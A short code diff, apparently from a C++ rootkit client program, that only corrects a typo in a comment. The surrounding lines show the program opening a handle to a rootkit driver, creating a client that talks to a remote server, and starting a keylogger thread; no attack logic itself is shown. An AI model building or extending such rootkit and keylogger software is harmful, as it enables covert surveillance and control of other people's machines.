@@ -14,7 +14,7 @@ int main(int argc, const char* argv[]) {
 	if (rootkit_handler.hDevice == INVALID_HANDLE_VALUE)
 		return logError("couldn't open a handle");
 
-	//network_cleint: interacts with the server.
+	//network_client: interacts with the server.
 	Network::RootkitClient network_client = Network::RootkitClient();
 
 	//keylogger thread
